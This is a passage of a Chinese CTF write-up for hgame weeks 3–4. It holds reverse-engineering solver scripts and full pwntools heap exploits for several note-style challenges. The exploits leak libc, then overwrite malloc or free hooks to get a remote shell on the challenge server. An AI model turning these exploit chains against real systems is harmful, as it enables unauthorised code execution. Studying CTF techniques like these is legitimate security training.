  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x20, 0x20, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x20, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x20
]
print(len(o))

pathr = ['0','1','2','3']
flag = ''
v14 = 0
for j in range(6,34):
    for i in pathr:
            if i == '3':
                v14 += 0x1
                if v14 <= 4095:
                    if o[v14] == 0x20 :
                        flag += i
                        break
                    else:
                        v14 -= 0x1
                else:
                    v14 -= 0x1
                    continue
            elif i == '1':
                v14 += 64
                if v14 <= 4095:
                    if o[v14] == 0x20 :
                        flag += i
                        break
                    else:
                        v14 -= 64
                else:
                    v14 -= 64
                    continue
            elif i == '2':
                v14 += 8
                if v14 <= 4095:
                    if o[v14] == 0x20 :
                        flag += i
                        break
                    else:
                        v14 -= 8
                else:
                    v14 -= 8
                    continue
            elif i == '0':
                v14 += 0x200
                if v14 <= 4095:
                    if o[v14] == 0x20 :
                        flag += i
                        break
                    else:
                        v14 -= 0x200
                else:
                    v14 -= 0x200
                    continue
print('hgame{'+flag+'}')
            
# hgame{3120113031203203222231003011}
```
## RE -> upx0
其实和upx没啥关系，就是个异或，参考官方WP
### exp
```python
# -*- coding: UTF-8 -*-
from z3 import *
import time
cmp_data =[
	0x8D68, 0x9D49,0x2A12,0x0AB1A
	,0x0CBDC,0x0B92B,0x2E32,0x9F59
	,0x0DDCD,0x9D49,0x0A90A,0x0E70
	,0x0F5CF,0x0A50,0x5AF5,0x0FF9F
	,0x9F59,0x0BD0B,0x58E5,0x3823
	,0x0BF1B,0x78A7,0x0AB1A,0x48C4
	,0x0A90A,0x2C22,0x9F59,0x5CC5
	,0x5ED5,0x78A7,0x2672,0x5695
]
a = '''
  for ( i = 0; i < (unsigned __int64)len_0(v16); ++i )
  {
    v12 = *((char *)v16 + i) << 8;
    for ( j = 0; j <= 7; ++j )
    {
      if ( (v12 & 0x8000) != 0 )
        v12 = (2 * v12) ^ 0x1021;
      else
        v12 *= 2;
    }
    v15[i] = (unsigned __int16)v12;
  }'''


def Z3solver(tmp):

		tmp = tmp<<8
		for j in range(8):
			if ((tmp)&0x8000 ) != 0:
				tmp = (tmp *2)^0x1021
			else:
				tmp *= 2
		tmp = tmp&0xffff
		# print(hex(tmp))
		return tmp
	
for i in range(32):

	for j in range(33,127):
		re = Z3solver(j)
		if re == cmp_data[i]:
			print(chr(j),end='')
			break

	
#noW_YOu~koNw-UPx~mAG|C_@Nd~crC16


```
## RE -> upx1(upx改标志符)
加了upx壳，但是upx查不到有壳，查看标志，将UPX?改为UPX!，即可脱壳，算法和upx0一样。
### exp
```python
# -*- coding: UTF-8 -*-
from z3 import *
import time
cmp_data =[
	0x8D68, 0x9D49,0x2A12,0x0AB1A
	,0x0CBDC,0x0B92B,0x2E32,0x9F59
	,0x0DDCD,0x9D49,0x0A90A,0x0E70
	,0x0F5CF,0x5ED5,0x3C03,0x7C87
	,0x2672,0xAB1A,0x0A50,0x5AF5
	,0x0FF9F,0x9F59,0x0BD0B,0x58E5
	,0x3823,0x0BF1B,0x78A7,0x0AB1A
	,0x48C4,0x0A90A,0x2C22,0x9F59
	,0x5CC5,0x5ED5,0x78A7,0x2672
	,0x5695
]

a = '''
  for ( i = 0; i < (unsigned __int64)len_0(v16); ++i )
  {
    v12 = *((char *)v16 + i) << 8;
    for ( j = 0; j <= 7; ++j )
    {
      if ( (v12 & 0x8000) != 0 )
        v12 = (2 * v12) ^ 0x1021;
      else
        v12 *= 2;
    }
    v15[i] = (unsigned __int16)v12;
  }'''


def Z3solver(tmp):

		tmp = tmp<<8
		for j in range(8):
			if ((tmp)&0x8000 ) != 0:
				tmp = (tmp *2)^0x1021
			else:
				tmp *= 2
		tmp = tmp&0xffff
		# print(hex(tmp))
		return tmp
	
for i in range(37):

	for j in range(33,127):
		re = Z3solver(j)
		if re == cmp_data[i]:
			print(chr(j),end='')
			break
#noW_YOu~koNw-rea1_UPx~mAG|C_@Nd~crC16
	
```
# week3
## PWN -> changeable_note
### 描述
    attachment
    题目地址 
    nc chuj.top 52441

    基准分数 200
### 分析
环境libc2.23，没开pie，没有UAF了，没有show，多了edit功能。edit功能里面用了gets函数造成堆溢出。
我的方法:
没有show功能，用stdout泄露libc地址，然后通过chunk overlap修改mallochook为one。其中涉及到了reallochook调整rsp的位置使得one生效。stdout泄露libc还需要爆破4bit。
官方解法：
较为古老的 unlink 利用，这种利用方法利用的是 unlink 可以把一个指针 p 改写为 &p - 0x18，所以我们借
此让某个处于 notes 数组内的指针指向数组，通过 edit 功能即可修改整个数组，由此实现任意写，我们可
以通过修改 free@got 为 puts，然后“free”一个存有 puts@got 的项即可实现 leak，leak 之后修改
free@got 为 system 即可 getshell。需要注意的是修改 free@got 时如果写 8 个字节会把 free 后的函数也
修改掉，这个时候少些一个字节就可以了（因为本来写入的第七八个字节就是 \x00 ，完全可以不写）
利用方法参考光放WP。
### exp
```python
# -*- coding: UTF-8 -*-
import hashlib
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
# local = True
io = remote('chuj.top', 52465) # chuj.top 52441
libc = ELF('./libc-2.23.so')
# io = process('note')
# libc = ELF('/home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def edit(idx,content):
    sl('2')
    sla('index?\n>> ',str(idx))
    sn(content)
    sl('\n')
def delete(idx):
	sl('3')
	sla('index?\n>> ',str(idx))

def exit(idx):
	sl('4')

if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

add(0,0x18,str(0)) # 0
add(1,0x68,str(1)) # 1
add(2,0x68,str(2)) # 2
add(3,0x30,str(3)) # 3
add(4,0x30,str(4)) # 4

edit(0,p64(0)*3+p64(0x60*2+0x10*2+1))


delete(1)
delete(2)
stdout = libc.sym['_IO_2_1_stdout_']
lg('stdout')
add(1,0x48,str(1))
add(5,0x10,str(5))
add(6,0x10,p16((0x4620-0x43)&0xffff))
edit(5,p64(0)*3+p8(0x71))
# dbg()
add(2,0x68,str(2))
add(7,0x68,'ppp'+p64(0)*6+p64(0xfbad1800)+p64(0)*3+'\x00')
libcbase = l64()-0x3c5600
lg('libcbase')

mallochook = libcbase + libc.sym['__malloc_hook']
reallochook = libcbase + libc.sym['__realloc_hook']
realloc = libcbase + libc.sym['realloc']
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()
lg('mallochook')
lg('reallochook')
lg('realloc')
lg('system')
lg('binsh')

add(14,0x40,str(0)) # 0
add(0,0x18,str(0)) # 0
add(1,0x68,str(1)) # 1
add(2,0x68,str(2)) # 2
add(3,0x68,str(3)) # 3
add(4,0x30,str(4)) # 4

edit(0,p64(0)*3+p64(0x60*2+0x10*2+1))


delete(1)
add(1,0x68,str(1))
delete(2)
delete(3)
add(5,0x58,str(5))
edit(1,p64(0)*13+p64(0x71))
# dbg()
delete(5)
add(9,0x68,p64(mallochook-0x23))
add(8,0x68,'8')
add(9,0x68,'9')
pause()
add(11,0x68,'a'*11+p64(libcbase+0x4527a)+p64(realloc)) #0x45226  0xf03a4 0xf1247 0x4527a
# dbg()

ru('>> ')
sl('1')
sa('index?\n>> ',str(12))
sa('size?\n>> ',str(32))

irt()



```
## PWN -> elder_note
### 分析
libc2.23，开了pie，逻辑还是上面的note，没有UAF，有了show。unsortedbin泄露libc，fastbin attack攻击malloc为one
### exp
```python
# -*- coding: UTF-8 -*-
import hashlib
from pwn import *
from pwnlib.util.iters import mbruteforce

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
io = remote('chuj.top', 52799) # chuj.top 52664
libc = ELF('./libc-2.23.so')
# io = process('note')
# libc = ELF('/home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def show(idx):
	sl('2')
	sla('index?\n>> ',str(idx))
		
def delete(idx):
	sl('3')
	sla('index?\n>> ',str(idx))

def exit(idx):
	sl('4')

if local == False:
    io.recvuntil(') == ') 
    hash_code = io.recvuntil('\n', drop=True).decode().strip() 
    log.success('hash_code={},'.format(hash_code)) 
    charset = string.printable 
    proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') 
    io.sendlineafter('????> ', proof)

add(0,0xf0,str(0)) # 0
add(1,0xf0,str(1)) # 1
delete(0)
show(0)
libcbase  = l64() - 0x3c4b78
lg('libcbase')
mallochook = libcbase + libc.sym['__malloc_hook']
reallochook = libcbase + libc.sym['__realloc_hook']
realloc = libcbase + libc.sym['realloc']
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()
lg('mallochook')
lg('reallochook')
lg('realloc')
lg('system')
lg('binsh')

add(2,0x68,str(2)) # 2
add(3,0x68,str(2)) # 3
add(4,0x68,str(2)) # 4

delete(3)
delete(2)
delete(3)
add(3,0x68,p64(mallochook-0x23))
add(2,0x68,'2')
add(3,0x68,'3')
add(5,0x68,'a'*11+p64(libcbase+0x4527a)+p64(realloc)) #0x45226  0xf03a4 0xf1247 0x4527a
# dbg()

ru('>> ')
sl('1')
sa('index?\n>> ',str(6))
sa('size?\n>> ',str(32))

irt()



```
## PWN -> sized_note
### 分析
环境libc2.27，还是程序note的逻辑，增删改查否有，没有UAF，add、edit有一个offbynull。
修改presize，释放到unsortedbin，泄露libc，然后制造chunk overlap，将同一块chunk释放到不同tcache链表，bypass tcache check，修改freehook为system。
官方wp用的是tcache attack实现修改freehook（释放两个相同chunk到tcache，edit将其中一个的fd改为freehook），详情参考官方WP

官方的方法较好，我当时忽略了edit功能没有校验释放的ptr为空，可以直接改释放后chunk的fd。
### exp
```python
# -*- coding: UTF-8 -*-
import hashlib
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
# local = True

io = remote('chuj.top', 52896) # chuj.top 51505
libc = ELF('./libc.so.6')
# io = process('note')
# libc = ELF('/home/yrl/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def show(idx):
	sl('2')
	sla('index?\n>> ',str(idx))
		
def delete(idx):
	sl('3')
	sla('index?\n>> ',str(idx))

def edit(idx,content):
    sl('4')
    sla('index?\n>> ',str(idx))
    sn(content)

if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

for i in range(7):
    add(i,0xf8,"aaaa")
add(7,0xf8,"aaaa")#7
add(8,0x88,"aaaa")#8
add(9,0xf8,"aaaa")#9
add(10,0x88,"aaaa")#10
for i in range(7):
    delete(i)
delete(8)
delete(7)
add(8,0x88,"a"*0x80+p64(0x90+0x100)) #8
delete(9)
for i in range(7):
    add(i,0xf8,"/bin/sh\x00")
add(7,0xf8,"aaaa")#7
show(8)
libcbase = l64()-0x3ebca0
lg('libcbase')
freehook = libcbase + libc.sym['__free_hook']
reallochook = libcbase + libc.sym['__realloc_hook']
realloc = libcbase + libc.sym['realloc']
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()
lg('freehook')
lg('reallochook')
lg('realloc')
lg('system')
lg('binsh')

# bypass tcache check
add(9,0x100,"dddd")
delete(9)
edit(7,0xf0*'a'+p64(0x100))
delete(8)
add(8,0x100,p64(freehook)) #0
# dbg()
add(9,0xf8,p64(freehook)) #9
add(11,0xf8,p64(system)) # 11
delete(5)
irt()


```
官方exp：
```python
# coding=utf-8 
from pwn import * 
from pwnlib.util.iters import mbruteforce 
import itertools 
import base64 
context.log_level = "debug" 
context.terminal = ["/bin/tmux", "splitw", "-h"]
# sh = process("./note") 
# libc = ELF("/home/yrl/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6")
libc = ELF("./libc.so.6") 
sh = remote("chuj.top",52896 ) 
sh.recvuntil(') == ') 
hash_code = sh.recvuntil('\n', drop=True).decode().strip() 
log.success('hash_code={},'.format(hash_code)) 
charset = string.printable 
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') 
sh.sendlineafter('????> ', proof)
def add(index, size, content): 
    sh.sendlineafter(">> ", "1") 
    sh.sendlineafter(">> ", str(index)) 
    sh.sendlineafter(">> ", str(size)) 
    sh.sendafter(">> ", content)

def show(index): 
    sh.sendlineafter(">> ", "2") 
    sh.sendlineafter(">> ", str(index)) 
def delete(index): 
    sh.sendlineafter(">> ", "3") 
    sh.sendlineafter(">> ", str(index)) 
def edit(index, payload): 
    sh.sendlineafter(">> ", "4") 
    sh.sendafter(">> ", str(index).ljust(8, '\x00')) 
    sh.send(payload) 
for i in range(0, 11): 
    add(i, 0xF8, "a"*0xF7) 
add(12, 0x60, '\n') 
for i in range(3, 10): 
    delete(i) 
delete(0) 
edit(1, 'a' * 0xF0 + p64(0x200)) 
delete(2) 
add(0, 0x78, "\n") 
add(0, 0x78, "\n") 
show(1) 
libc_base = u64(sh.recv(6).ljust(8, '\x00')) - libc.sym["__malloc_hook"] - 0x10 - 0x60 
log.success("libc_base={}".format(hex(libc_base))) 
__free_hook = libc_base + libc.sym["__free_hook"] 
system = libc_base + libc.sym["system"] 
gdb.attach(sh)
add(0, 0x60, '\n') 
delete(12) 
delete(0) 
edit(1, p64(__free_hook)) 
add(1, 0x60, '/bin/sh\x00') 
add(2, 0x60, p64(system)) 
delete(1) 
sh.interactive()
```
## RE
参考官方WP。
# week4
## PWN -> vector (resize扩容，double free)

此题目发现了一个非预期漏洞点，但是此漏洞点条件不足，无法完成利用，出题人的预置漏洞点主要是vector的resize函数在扩容的过程中会将原有的空间free掉，再重新申请合适的大小并将原有的内容复制过去，此时通过move_note可以在vector里制造两个相同的note，造成double free。
```c
    if ( !*(_QWORD *)std::vector<char *>::operator[](&notes, v3) )
    {
    v1 = (_QWORD *)__gnu_cxx::__normal_iterator<char **,std::vector<char *>>::operator*(&i);// 若扩容，此指针仍指向原来释放的chunk，导致后面赋值为0的时候并没有将新的chunk位置赋值为0
    *(_QWORD *)std::vector<char *>::operator[](&notes, v3) = *v1;
    *(_QWORD *)__gnu_cxx::__normal_iterator<char **,std::vector<char *>>::operator*(&i) = 0LL;// 若扩容后移动，赋值为0的是原free掉的chunk内的指针，导致新chunk没有被置0，double free
    }
    puts("done!");
```
## exp
```python
# -*- coding: UTF-8 -*-
import hashlib
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
# local = True

io = remote('chuj.top', 53175) # nc chuj.top 53175
libc = ELF('./libc.so.6')
# io = process('vector')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def show(idx):
	sl('3')
	sla('index?\n>> ',str(idx))
		
def delete(idx):
	sl('4')
	sla('index?\n>> ',str(idx))

def edit(idx):
    sl('2')
def move(from_idx,to_idx):
    sl('5')
    for i in range(from_idx):
        sa('move? [1/0]\n>> ',str(0))
    
    sa('move? [1/0]\n>> ',str(1))
    sa('move to?\n>> ',str(to_idx))


if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

for i in range(8):
    add(i,0x100,str(i))
for i in range(8,10):
    add(i,0x70,str(i))
for i in range(1,8):
    delete(i)
delete(0)
add(0,0x50,'aaaaaaaa')
show(0)
ru('aaaaaaaa')
libcbase = l64() - 0x1ebce0
lg('libcbase')
system = libcbase + libc.symbols['system']
freehook = libcbase + libc.symbols['__free_hook']
lg('system')
lg('freehook')
# dbg()
for i in range(1,8):
    add(i,0x70,str(i))
# dbg()
move(2,17)
add(10,0x70,str(10))
for i in range(3,10):
    delete(i)
delete(2)
delete(10)
delete(17)

for i in range(2,9):
    add(i,0x70,str(i))

add(9,0x70,p64(freehook))

add(11,0x70,'11')
add(12,0x70,'/bin/sh\x00')
add(13,0x70,p64(system))

delete(12)


irt()



```
## RE -> WOW
### 描述
    描述
